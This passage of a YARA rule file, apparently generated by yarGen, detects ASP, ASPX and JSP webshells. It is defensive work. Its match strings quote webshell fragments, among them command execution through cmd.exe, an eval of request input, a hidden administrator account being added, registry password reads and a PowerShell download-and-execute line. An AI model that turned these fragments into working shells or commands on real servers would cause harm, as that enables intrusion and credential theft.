      $s19 = "Set rs=conn.Execute(ybgqm,-1,&H0001)" fullword ascii
      $s20 = "If yoc=\"\"Then yoc=Replace(\"HK\"+xoncv+\"LM\\SYSTEM\\Curre\"+fewse+\"ntControlSet\\Control\\ComputerNa\"+wwva+\"me\\ComputerNa" ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Cmdwebshell {
   meta:
      description = "webshell - file Cmdwebshell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ee03d95eedaec69608600dc07b35db774c0182e9e60787c4cda9626e4dc0d513"
   strings:
      $x1 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii
      $x2 = "Set ijre=zsckm.ExecQuery(\"select * from Win32_Pro\"&ivj&\"cess where ProcessId='\"&pid&\"'\")" fullword ascii
      $x3 = "bdyaf=bdyaf&\"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>\"" fullword ascii
      $s4 = "Set qxau=zsckm.ExecQuery(\"select * from Win3\"&dwt&\"2_Service where Name='\"&dlzu&\"'\")" fullword ascii
      $s5 = "Set rrf=zsckm.ExecQuery(\"select * from Win32_NetworkAda\"&dkp&\"pterConfiguration where IPEnabled ='True'\")" fullword ascii
      $s6 = "bdyaf=bdyaf&\"<a href='http://0kee.com/' target='_blank'>0kee Team</a> | \"" fullword ascii
      $s7 = "Set mgl=blhvq.Execute(str)" fullword ascii
      $s8 = "Set qifc=zsckm.ExecQuery(\"Select ServerComment,ServerBindings from II\"&rvx&\"SWebServerSetting where Name='\"&Replace(objWebDo" ascii
      $s9 = "set ss=zsckm.get(\"Win32_ProcessSta\"&uyy&\"rtup\")" fullword ascii
      $s10 = "Set qifc=zsckm.ExecQuery(\"Select ServerComment,ServerBindings from II\"&rvx&\"SWebServerSetting where Name='\"&Replace(objWebDo" ascii
      $s11 = "On Error Resume Next:Execute nedsl&\".\"&strPam&\".value=rsdx(\"&nedsl&\".\"&strPam&\".value)\"" fullword ascii
      $s12 = "zepw\"C:\\Documents and Settings\\All Users\\Documents\",\"Documents\"" fullword ascii
      $s13 = "zepw\"C:\\Documents and Settings\\All Users\",\"All Users\"" fullword ascii
      $s14 = "zepw\"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\",\"Start Menu->Programs\"" fullword ascii
      $s15 = "bdyaf=bdyaf&\"<a href='http://www.t00ls.net/' target='_blank'>T00ls</a> | \"" fullword ascii
      $s16 = "zepw\"C:\\Program Files\\RhinoSoft.com\",\"RhinoSoft.com\"" fullword ascii
      $s17 = "bdyaf=bdyaf&\"<a href='http://www.vtwo.cn/' target='_blank'>Bink Team</a> | \"" fullword ascii
      $s18 = "zhv\"com\"&sruz&\"mand execute fail-_-!RPWT?\"" fullword ascii
      $s19 = "zhv\"com\"&sruz&\"mand execute succeed!Refresh the iframe below to check result.\"" fullword ascii
      $s20 = "doTd cpmvi.ExecutablePath,\"\"" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule webshell_aspx_antak {
   meta:
      description = "webshell - file antak.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "48ab098fdf2df49cb79880d67daea425ce49166fb29535ff6c0ad3751fe77877"
   strings:
      $x1 = "//http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html" fullword ascii
      $x2 = "Executing PowerShell scripts on the target - " fullword ascii
      $s3 = "1. Paste the script in command textbox and click 'Encode and Execute'. A reasonably large script could be executed using this." fullword ascii
      $s4 = "        output.Text = @\"Use this shell as a normal powershell console. Each command is executed in a new process, keep this in " ascii
      $s5 = "        output.Text = @\"Use this shell as a normal powershell console. Each command is executed in a new process, keep this in " ascii
      $s6 = "2. Use powershell one-liner (example below) for download & execute in the command box." fullword ascii
      $s7 = "3. By uploading the script to the target and executing it." fullword ascii
      $s8 = "void execcommand(string cmd)" fullword ascii
      $s9 = "while using commands (like changing current directory or running session aware scripts). " fullword ascii
      $s10 = "    psi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;" fullword ascii
      $s11 = "To download a file enter the actual path on the server in command textbox." fullword ascii
      $s12 = "Downloading a file - " fullword ascii
      $s13 = "onkeydown=\"if(event.keyCode == 13) document.getElementById('cmd').click()\" Height=\"23px\" AutoCompleteType=\"None\"></asp:Tex" ascii
      $s14 = "(OS temporary directory like C:\\Windows\\Temp may be writable.)" fullword ascii
      $s15 = "http://www.labofapenetrationtester.com/2014/06/introducing-antak.html" fullword ascii
      $s16 = "<%@ Import Namespace=\"System.IO.Compression\" %>" fullword ascii
      $s17 = "https://github.com/samratashok/nishang" fullword ascii
      $s18 = "<%--Antak - A Webshell which utilizes powershell.--%>" fullword ascii
      $s19 = "// Compression and encoding directly stolen from Compress-PostScript by Carlos Perez" fullword ascii
      $s20 = "IEX ((New-Object Net.WebClient).DownloadString('URL to script here')); [Arguments here]" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule spjspshell {
   meta:
      description = "webshell - file spjspshell.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "475e9db9b5973192268d4c3964f1fc2ff200a735427954379ff1d02fa4a9782a"
   strings:
      $x1 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:\\winnt\\win.ini" fullword ascii
      $x2 = "Process child = Runtime.getRuntime().exec(cmd);" fullword ascii
      $x3 = "* action=piped&remoteHost=192.168.0.1&remotePort=25&myIp=218.0.0.1&myPort=12345 -- " fullword ascii
      $s4 = "* action=login&username=root&password=helloroot&myPort=65534 -- " fullword ascii
      $s5 = "* action=tunnel&remoteHost=192.168.0.1&remotePort=23&myPort=65534 -- " fullword ascii
      $s6 = "* ]http://victim/webshell.jsp?[options]" fullword ascii
      $s7 = "* action=send&myShell=&myPort=&cmd= -- " fullword ascii
      $s8 = "* E-mail: wangyun188@hotmail.com" fullword ascii
      $s9 = "* action=login&username=&password=&myPort=" fullword ascii
      $s10 = "* action=shell&cmd= -- " fullword ascii
      $s11 = "out.print(tc.wait(\"login:\"));" fullword ascii
      $s12 = "* action=piped&remoteHost=&remotePort=&myIp=&myPort=" fullword ascii
      $s13 = "* action=send&myShell=&myPort=&cmd=" fullword ascii
      $s14 = "out.print(tc.wait(\"Password:\"));" fullword ascii
      $s15 = "* action=tunnel&remoteHost=&remotePort=&myPort=" fullword ascii
      $s16 = "* action=shell&cmd=" fullword ascii
      $s17 = "* WEBSHELL.JSP" fullword ascii
      $s18 = "* action=close&myPort= -- " fullword ascii
      $s19 = "String remoteHost = request.getParameter(\"remoteHost\");" fullword ascii
      $s20 = "String password = request.getParameter(\"password\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule webshell_aspx_editor {
   meta:
      description = "webshell - file editor.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5a2b42f395e836e2de823d8a19acf85ebc580b9e6b44270eee5af0ba023b91e2"
   strings:
      $s1 = "<%@Page Language=\"Jscript\"%><%eval(Request.Item[\"iceking\"],\"unsafe\");%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule filesystembrowser {
   meta:
      description = "webshell - file filesystembrowser.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "378b4a644f60d3e469486ec4ee1911330b36323185b82e1a3b96a1ec8e795638"
   strings:
      $s1 = "<!-- Created by Mark Woan (http://www.woanware.co.uk) -->" fullword ascii
      $s2 = "                response.Append(\"<tr><td>file&nbsp;<a href=\\\"?file=\" + fileInfo.FullName + \"&authkey=\" + Request.Params[\"" ascii
      $s3 = "\"] + \"&operation=download\\\">\" + fileInfo.FullName + \"</a></td><td>\");" fullword ascii
      $s4 = "    private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbod" ascii
      $s5 = ",pre,form input,form select {\\n font-family: \\\"Lucida Console\\\", monospace;\\n font-size: 88%;\\n}\\n-->\\n</style></head>" ascii
      $s6 = "uthkey\"] + \"&operation=list\\\">\" + dirs.FullName + \"</a></td></tr>\");" fullword ascii
      $s7 = "                response.Append(\"<tr><td>dir&nbsp;&nbsp;<a href=\\\"?directory=\" + dirs.FullName + \"&authkey=\" + Request.Par" ascii
      $s8 = "            Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + Path.GetFileName(file));" fullword ascii
      $s9 = "                string[] tempDrives = Environment.GetLogicalDrives();" fullword ascii
      $s10 = "    private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbod" ascii
      $s11 = "<%@ Import namespace=\"System.Diagnostics\"%>" fullword ascii
      $s12 = "<script language=\"c#\" runat=\"server\">" fullword ascii
      $s13 = "                if (Request.Params[\"operation\"] == \"download\")" fullword ascii
      $s14 = "            Response.AddHeader(\"Content-Length\", new FileInfo(file).Length.ToString());" fullword ascii
      $s15 = "                response.Append(\"<tr><td>file&nbsp;<a href=\\\"?file=\" + fileInfo.FullName + \"&authkey=\" + Request.Params[\"" ascii
      $s16 = "                response.Append(\"<tr><td>dir&nbsp;&nbsp;<a href=\\\"?directory=\" + dirs.FullName + \"&authkey=\" + Request.Par" ascii
      $s17 = "            response.Append(\"&authkey=\" + Request.Params[\"authkey\"]);" fullword ascii
      $s18 = "                response.Append(\"&authkey=\" + Request.Params[\"authkey\"]);" fullword ascii
      $s19 = "    private const string AUTHKEY = \"woanware\";" fullword ascii
      $s20 = "            response.Append(@\"<td><asp:TextBox id=\"\"txtAuthKey\"\" runat=\"\"server\"\"></asp:TextBox></td>\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule webshell_asp_ {
   meta:
      description = "webshell - file .asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0ba9d0d668d00ee68a2869c6a1b9c05f08469daa84f177079e76e4baeef7748c"
   strings:
      $x1 = "\\PremiumSoft\\\"&br&\"x:\\manager\\HostManagerService\\\"&br&\"x:\\rar\\\"&br&\"x:\\StatisticsClient\\analog6\\analyzeres\\\"&b" ascii
      $x2 = "jgb.execute(\"select * from openrowS\"&owm&\"et('microsoft.jet.oledb.4.0',';database=\" & path &\"','select shell(\"&chr(34)&\"c" ascii
      $x3 = "jgb.Execute(\"create table [jnc](resulttxt nvarchar(1024) null);exec mast\"&kvp&\"er..xp_regwrite 'hkey_local_machine','SOF\"&jj" ascii
      $x4 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\dat" ascii
      $x5 = "\\\"&br&\"x:\\Program Files\\Common Files\\Thunder Network\\\"&br&\"x:\\Program Files\\Common Files\\Borland Shared\\BDE\\\"&br&" ascii
      $x6 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL_MACHINE','SOF\"&jjl&\"TWARE\\Microsoft\\Jet\\4." ascii
      $x7 = "bvn=\"<title>\"&nkw&\" - \"&jmc&\" </title><style type='text/css'>body{border:0;margin:0;table-layout:fixed;color:\"&cl(13)&\";f" ascii
      $x8 = "jgb.execute(\"select * from openrowS\"&owm&\"et('microsoft.jet.oledb.4.0',';database=\" & path &\"','select shell(\"&chr(34)&\"c" ascii
      $x9 = "\\\"&br&\"x:\\ISAPI_Rewrite3\\\"&br&\"x:\\IMail\\\"&br&\"x:\\com\\\"&br&\"x:\\Program Files\\FlashFXP\\\"&br&\"x:\\FlashFXP\\\"&" ascii
      $x10 = "jgb.Execute(\"create table [jnc](resulttxt nvarchar(1024) null);use mast\"&kvp&\"er declare @o int exec sp_oacre\"&nnm&\"ate 'WS" ascii
      $x11 = "txk=\"drop table [jnc];exec mast\"&kvp&\"er..xp_regwrite 'hkey_local_machine','SOF\"&jjl&\"TWARE\\microsoft\\jet\\4.0\\Engi\"&dm" ascii
      $x12 = "jgb.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,binPath VarChar,binContent Image)\")" fullword ascii
      $x13 = "\"&gbp&\"32\\ias\\ias.mdb','select shell(&quot;cmd.exe /c del 8617.tmp&&del jnc.tmp&quot;)');\"\">xp_regwrite" fullword ascii
      $x14 = ".0',';database=\" & path &\"','select shell(\"&chr(34)&\"cmd.exe /c \"&kkw&\" > 8617.tmp\"&chr(34)&\")');\")" fullword ascii
      $x15 = "7i24.com\\Serverdoctor\\log\\\"&br&\"x:\\DBbackup\\\"&br&\"x:\\Oracle\\\"&br&\"x:\\VhostManage\\DataBase\\site.mdb\"&br&\"x:\\8u" ascii
      $x16 = "s\\SogouInput\\\"&br&\"x:\\imail\\\"&br&\"x:\\hzhost\\hzhost_conpanel\\\"&br&\"x:\\ftproot\\\"&br&\"x:\\Config.Msi\\\"&br&\"x:" ascii
      $x17 = "\\\"&br&\"x:\\Program Files\\LuDaShi\\\"&br&\"x:\\360Rec\\\"&br&\"x:\\Documents and Settings\\All Users\\Start Menu\\\"&br&\"x:" ascii
      $x18 = ".txt\"&br&\"x:\\data\\\"&br&\"x:\\vhostroot\\\"&br&\"x:\\Program Files\\Gene6 FTP Server\\RemoteAdmin\\Remote.ini\"&br&\"x:\\Rec" ascii
      $x19 = "response.write \"<body style=\"\"background:url(http://ll4best.com/images/radhatbg.jpg) no-repeat center center;\"\"> <center><F" ascii
      $x20 = ".txt\"&br&\"x:\\data\\\"&br&\"x:\\vhostroot\\\"&br&\"x:\\Program Files\\Gene6 FTP Server\\RemoteAdmin\\Remote.ini\"&br&\"x:\\Rec" ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*)
}

rule fileupload {
   meta:
      description = "webshell - file fileupload.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3a6091fd5b5755d0249ef4d6af11c807dbe902c2428f923ad2490e99ebbf06ad"
   strings:
      $s1 = "<!-- Created by Mark Woan (http://www.woanware.co.uk) -->" fullword ascii
      $s2 = "        temp = \"<form enctype=\\\"multipart/form-data\\\" action=\\\"?operation=upload\\\" method=\\\"post\\\">\";" fullword ascii
      $s3 = "    private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbod" ascii
      $s4 = ",pre,form input,form select {\\n font-family: \\\"Lucida Console\\\", monospace;\\n font-size: 88%;\\n}\\n-->\\n</style></head>" ascii
      $s5 = "            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.F" ascii
      $s6 = "            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.F" ascii
      $s7 = "        temp += \"<br>Auth Key: <input type=\\\"text\\\" name=\\\"authKey\\\"><br>\";" fullword ascii
      $s8 = "            int fileLength = httpPostedFile.ContentLength;" fullword ascii
      $s9 = "    private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbod" ascii
      $s10 = "            httpPostedFile.InputStream.Read(buffer, 0, fileLength);" fullword ascii
      $s11 = "    private string GetUploadControls()" fullword ascii
      $s12 = "    private const string AUTHKEY = \"woanware\";" fullword ascii
      $s13 = "            HttpPostedFile httpPostedFile = Request.Files[0];" fullword ascii
      $s14 = "        temp += \"<div><input type=\\\"submit\\\" value=\\\"Send\\\"></div>\";" fullword ascii
      $s15 = "        return temp;" fullword ascii
      $s16 = "        temp += \"</form>\";" fullword ascii
      $s17 = "                if (Request.Params[\"operation\"] == \"upload\")" fullword ascii
      $s18 = "        string temp = string.Empty;" fullword ascii
      $s19 = "        temp += \"<br>Please specify a file: <input type=\\\"file\\\" name=\\\"file\\\"></br>\";" fullword ascii
      $s20 = "                Response.Write(this.GetUploadControls());" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 10KB and
      8 of them
}

rule webshell_asp_ {
   meta:
      description = "webshell - file .asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $x2 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
      $s3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>Documents</a>" fullword ascii
      $s4 = "Function ScReWr(folder):on error resume next :Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename:Set FSO = Server.Createobject(" ascii
      $s5 = "Function ScReWr(folder):On Error Resume Next:Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename:Set FSO = Server.Createobject(C" ascii
      $s6 = "strBAD=strBAD&\"If Session(\"\"#\"\")<>\"\"\"\" Then Execute(Session(\"\"#\"\"))\"" fullword ascii
      $s7 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
      $s8 = "</center>\":SI=SI&BackUrl:j SI:Response.End:End If:If Path<>\"\" Then:Set T=CF.opentextfile(Path, 1, False):Txt=HTMLEncode(T.rea" ascii
      $s9 = "<a href='javascript:ShowFolder(\"\"D:\\\\RECYCLER\\\\\"\")'>D:\\RECYCLER</a>" fullword ascii
      $s10 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>C:\\\\RECYCLER</a>" fullword ascii
      $s11 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'><input name='LocalFile' type='file' " ascii
      $s12 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'><input name='LocalFile' type='file' " ascii
      $s13 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s14 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s15 = "<a href='?Action=cmdx' target='FileFrame'> <font color=red> " fullword ascii
      $s16 = "j \"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s17 = "j \"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s18 = "l) :T.close:Set T=Nothing:Else:Path=Session(\"FolderPath\")&\"\\shell.asp\":Txt=strBAD:End If:j \"<Form action='\"&URL&\"?Action" ascii
      $s19 = "net.exe net1.exe" fullword ascii
      $s20 = "execute(king(\"trgetr=tktivnfQeY" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_ {
   meta:
      description = "webshell - file .asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $x2 = "j oScriptlhn.exec(\"cmd.exe /c\"&request(\"cmd\")).stdout.readall " fullword ascii
      $x3 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
      $x4 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
      $x5 = "i=i+1:Next:copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39" ascii
      $x6 = "if shellpath=\"\" then shellpath = \"cmd.exe\"" fullword ascii
      $s7 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&domain&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s8 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
      $s9 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
      $s10 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
      $s11 = "j cdx&\"<a href='http://odayexp.com/h4cker/gx/' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s12 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
      $s13 = "set dd=cm.exec(shellpath&\" /c \"&defcmd)" fullword ascii
      $s14 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s15 = "end if :j oScriptlhn.exec(request(\"cmdx\")&\" /c\"&request(\"cmd\")).stdout.readall :j(\"</textarea></center>\")" fullword ascii
      $s16 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
      $s17 = "Paths_str=\"c:\\windows\\\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\\"&chr(13)&chr(10)&\"c:\\Program Files\\\"&chr(13)&chr" ascii
      $s18 = "Passwd=Wsh.RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword\")" fullword ascii
      $s19 = "strBAD=strBAD&\"If Session(\"\"#\"\")<>\"\"\"\" Then Execute(Session(\"\"#\"\"))\"" fullword ascii
      $s20 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule __1_ {
   meta:
      description = "webshell - file  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $x2 = "j oScriptlhn.exec(\"cmd.exe /c\"&request(\"cmd\")).stdout.readall " fullword ascii
      $x3 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
      $x4 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
      $x5 = "i=i+1:Next:copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39" ascii
      $x6 = "if shellpath=\"\" then shellpath = \"cmd.exe\"" fullword ascii
      $s7 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&domain&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s8 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
      $s9 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
      $s10 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
      $s11 = "j cdx&\"<a href='http://odayexp.com/h4cker/gx/' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s12 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
      $s13 = "set dd=cm.exec(shellpath&\" /c \"&defcmd)" fullword ascii
      $s14 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s15 = "end if :j oScriptlhn.exec(request(\"cmdx\")&\" /c\"&request(\"cmd\")).stdout.readall :j(\"</textarea></center>\")" fullword ascii
      $s16 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
      $s17 = "Paths_str=\"c:\\windows\\\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\\"&chr(13)&chr(10)&\"c:\\Program Files\\\"&chr(13)&chr" ascii
      $s18 = "Passwd=Wsh.RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword\")" fullword ascii
      $s19 = "strBAD=strBAD&\"If Session(\"\"#\"\")<>\"\"\"\" Then Execute(Session(\"\"#\"\"))\"" fullword ascii
      $s20 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_cmdasp {
   meta:
      description = "webshell - file cmdasp.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "101bf8dcdd414f09ba46cdecbd96e8606c79b0e76b6a2ce040395e775cb4da86"
   strings:
      $x1 = "    Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
      $s2 = "    ' -- Read the output from our command and remove the temp file -- '" fullword ascii
      $s3 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
      $s4 = "  ' -- check for a command that we have posted -- '" fullword ascii
      $s5 = "<!--    http://michaeldaw.org   2006    -->" fullword ascii
      $s6 = "    szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
      $s7 = "  '  Author:  Maceo <maceo @ dogmile.com>" fullword ascii
      $s8 = "  ' -- create the COM objects that we will be using -- '" fullword ascii
      $s9 = "  Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
      $s10 = "  szCMD = Request.Form(\".CMD\")" fullword ascii
      $s11 = "    ' -- Use a poor man's pipe ... a temp file -- '" fullword ascii
      $s12 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
      $s13 = "  Dim szCMD, szTempFile" fullword ascii
      $s14 = "  Dim oScript" fullword ascii
      $s15 = "<%@ Language=VBScript %>" fullword ascii
      $s16 = "  Dim oScriptNet" fullword ascii
      $s17 = "  Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
      $s18 = "  Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s19 = "<FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\">" fullword ascii
      $s20 = "  If (szCMD <> \"\") Then" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_dabao {
   meta:
      description = "webshell - file dabao.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "94b932cffbc4e3361a13c8a15341c0c3f59723dfcfa5dd3d088214cfc1147aff"
   strings:
      $s1 = "  Session(ScriptName) = Trim(Request(\"PassWord\"))" fullword ascii
      $s2 = "If Trim(Session(ScriptName))=Trim(PassWord) Then" fullword ascii
      $s3 = " Echo \"<input type=password name=PassWord value=\"\"\" & Session(ScriptName) & \"\"\" /></td>\"" fullword ascii
      $s4 = "If Trim(Session(ScriptName))<>Trim(PassWord) Then" fullword ascii
      $s5 = "<a href=http://www.5luyu.cn target=\"\"_blank\"\">http://www.5luyu.cn</a></div>\"" fullword ascii
      $s6 = "Server.ScriptTimeout = 999999999 '" fullword ascii
      $s7 = "')\"\" method=post action=\"\"\"&ScriptName&\"\"\">\"" fullword ascii
      $s8 = "Response.ExpiresAbsolute = Now() - 1" fullword ascii
      $s9 = " Echo \"<form id=Frm_Enter name=Frm_Enter method=post action=\"\"\" & ScriptName &\"\"\">\"" fullword ascii
      $s10 = " Echo \"<form id=Frm_Pack name=Frm_Pack method=post action=\"\"\" & ScriptName & \"\"\">\"" fullword ascii
      $s11 = "')\"\" method=post action='\" & ScriptName & \"'>\"" fullword ascii
      $s12 = " Response.AddHeader \"Content-Disposition\",\"attachment; filename=\" & Request(\"Down\")" fullword ascii
      $s13 = " Echo \"<input size=28 type=text name=FileName value=\"&request.ServerVariables(\"HTTP_HOST\")&\" />&nbsp;&nbsp;\"" fullword ascii
      $s14 = "Const PassWord = \"123456\" '" fullword ascii
